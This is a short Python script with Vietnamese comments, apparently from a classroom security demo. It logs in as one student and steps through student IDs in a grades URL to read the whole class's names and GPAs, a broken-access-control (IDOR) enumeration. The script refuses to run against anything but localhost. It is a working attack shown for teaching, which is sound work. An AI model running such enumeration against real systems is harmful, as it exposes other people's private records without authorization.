#!/usr/bin/env python3
"""
Màn 3: đăng nhập bằng tài khoản An, rồi đổi MSSV từ 23520001 đến 23520030
để đọc bảng điểm của cả lớp. Mặc định đi qua mitmproxy (cổng 18080).

Chỉ chạy với lab trên máy này (127.0.0.1 / localhost).

Cách chạy:  python enumerate.py
"""
import http.cookiejar
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
if urllib.parse.urlparse(BASE).hostname not in ("127.0.0.1", "localhost"):
    sys.exit("Chỉ chạy với lab trên máy này (127.0.0.1 / localhost).")

# 1. Đăng nhập bằng tài khoản An (cookie được tự lưu lại)
web = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
web.open(BASE + "/login", b"username=an&password=an123")

# 2. Cùng một cookie, chỉ đổi con số trên URL
found = 0
for mssv in range(23520001, 23520031):
    try:
        page = web.open(f"{BASE}/students/{mssv}/grades").read().decode()
        name = re.search(r'class="owner"><b>([^<]+)</b>', page).group(1)
        gpa = re.search(r"Điểm trung bình</th><th>([\d.]+)", page).group(1)
        print(mssv, name, "- ĐTB", gpa)
        found += 1
    except urllib.error.HTTPError as e:
        print(mssv, "bị chặn", e.code)
    time.sleep(0.3)  # chậm lại để khán giả kịp nhìn mitmweb

print(f"Đọc được {found}/30 bảng điểm.")
